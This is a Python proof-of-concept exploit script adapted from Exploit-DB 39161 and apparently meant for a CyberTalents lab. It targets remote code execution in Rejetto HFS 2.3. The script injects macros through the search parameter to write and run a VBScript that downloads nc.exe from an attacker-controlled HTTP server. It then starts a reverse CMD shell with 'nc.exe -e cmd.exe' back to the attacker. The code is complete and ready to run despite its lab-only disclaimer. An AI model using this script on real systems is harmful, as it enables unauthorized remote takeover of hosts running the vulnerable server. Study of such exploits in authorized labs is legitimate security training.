#!/usr/bin/env python3
"""Python 3 adaptation of Exploit-DB 39161 for an authorized HFS 2.3 lab.

This proof of concept stages nc.exe over HTTP, asks vulnerable Rejetto HFS to
write and execute a VBScript downloader, then asks HFS to launch a reverse CMD
shell. Use only against a lab target you are explicitly authorized to test.

Usage:
    python3 hfs_rce.py <target-ip> <target-port> <attacker-ip> [shell-port]

The downloader in this PoC expects nc.exe to be served by an HTTP server on
attacker TCP/80, matching the original Exploit-DB 39161 payload.
"""

from __future__ import annotations

import argparse
import sys
import time
from urllib.error import HTTPError, URLError
from urllib.request import urlopen


def send_macro(target: str, target_port: int, macro: str, label: str) -> None:
    url = f"http://{target}:{target_port}/?search=%00{{.+{macro}.}}"
    print(f"[+] {label}")
    try:
        with urlopen(url, timeout=12) as response:
            # HFS can return an HTTP response even if the resulting command
            # later fails; the listener and HTTP server logs are the real checks.
            print(f"    HTTP status: {response.status}")
            response.read()
    except HTTPError as exc:
        print(f"[-] HTTP error during {label}: {exc.code} {exc.reason}")
        raise
    except (URLError, TimeoutError, OSError) as exc:
        print(f"[-] Request failed during {label}: {exc}")
        raise


def build_payloads(attacker_ip: str, shell_port: int) -> tuple[str, str, str]:
    # The VBScript downloads the Windows netcat binary from the attacker's
    # HTTP server, then saves it under C:\\Users\\Public.
    downloader = (
        r"C:\Users\Public\script.vbs|"
        "dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0A"
        "dim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0A"
        "xHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"
        f"{attacker_ip}"
        "%2Fnc.exe%22%2C%20False%0D%0A"
        "xHttp.Send%0D%0A%0D%0A"
        "with%20bStrm%0D%0A"
        "%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A"
        "%20%20%20%20.open%0D%0A"
        "%20%20%20%20.write%20xHttp.responseBody%0D%0A"
        "%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0A"
        "end%20with"
    )
    create_vbs = "save|" + downloader
    run_vbs = "exec|cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
    run_nc = (
        "exec|C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"
        f"{attacker_ip}%20{shell_port}"
    )
    return create_vbs, run_vbs, run_nc


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Send the HFS 2.3 lab payload from Exploit-DB 39161."
    )
    parser.add_argument("target_ip", help="Current lab target IP")
    parser.add_argument("target_port", type=int, help="HFS TCP port (usually 1337)")
    parser.add_argument("attacker_ip", help="Attacker VPN IP reachable from the target")
    parser.add_argument("shell_port", type=int, nargs="?", default=5555,
                        help="Reverse-shell listener port (default: 5555)")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    create_vbs, run_vbs, run_nc = build_payloads(args.attacker_ip, args.shell_port)

    print("[!] Use only in your authorized CyberTalents lab.")
    print(f"[+] Target: {args.target_ip}:{args.target_port}")
    print(f"[+] Callback: {args.attacker_ip}:{args.shell_port}")
    print("[i] Make sure nc.exe is available from the attacker's HTTP server on TCP/80.")
    print("[i] Start the HTTP server and Netcat listener before running this script.")

    try:
        send_macro(args.target_ip, args.target_port, create_vbs,
                   "Sending the VBS file-creation request...")
        time.sleep(1)
        send_macro(args.target_ip, args.target_port, run_vbs,
                   "Executing the VBS downloader...")
        time.sleep(1)
        send_macro(args.target_ip, args.target_port, run_nc,
                   "Starting the reverse CMD connection...")
    except Exception:
        print("[-] One of the HTTP requests failed. Review the target address, port, VPN, and HFS service.")
        return 1

    print("[+] Requests sent. Check the HTTP server log and the Netcat listener.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
